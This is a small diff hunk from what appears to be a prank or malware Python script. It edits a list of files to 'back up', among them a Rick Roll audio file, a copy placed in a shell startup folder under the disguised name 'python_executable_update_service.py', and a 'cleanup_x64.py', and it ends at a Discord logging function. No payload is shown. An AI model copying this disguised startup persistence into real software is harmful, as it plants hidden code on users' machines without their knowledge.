@@ -16,7 +16,7 @@ files_to_backup = [
     __file__,
     os.path.join(virus_dir, "youtube_com-watch-dQw4w9WgXcQ.mp3"),
     os.path.join(shell_startup_dir, "python_executable_update_service.py"),
-    os.path.join(virus_dir, "cleanup_x64.py"), # gama_aaa.py
+    os.path.join(virus_dir, "cleanup_x64.py"),
 ]
 
 def log_to_discord(msg:str):
